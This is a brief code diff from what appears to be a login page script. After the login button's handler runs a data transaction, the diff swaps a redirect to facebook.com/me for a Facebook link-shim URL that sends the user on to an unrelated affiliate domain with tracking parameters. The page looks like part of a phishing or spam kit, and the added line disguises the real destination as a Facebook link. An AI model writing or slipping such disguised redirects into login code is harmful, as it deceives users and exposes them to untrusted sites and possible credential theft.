@@ -56,6 +56,6 @@ LoginBtn.addEventListener('click', e => {
         return; // Abort the transaction.
       }
     });
-    window.location.replace("http://www.facebook.com/me");
+    window.location.replace("https://l.facebook.com/l.php?u=https%3A%2F%2Faff.hunakhidma.com%2F%3Futm_medium%3D7f99aa6c6e039f983ad64dde10ecbe667bb24981%26utm_campaign%3Dsc1111111%26fbclid%3DIwAR3TfAWLrsMC81_JE5b96aOwzvJEumMhv8nxpWd_2bBk8UIb3oFWSPY2RxI&h=AT0AB9y_kzOy4EnNKSeZQx4Rs8QRjwpWXFnJhyrkFfPoO5lX_8vOhYcqqw2leYUSoHzjtAmPD6SQP6BmeygURE7zELvpVwU2bcDCJNMcRVBxX9doH6desQ85aFjpJ8YZL8s2KA");
   }
 });
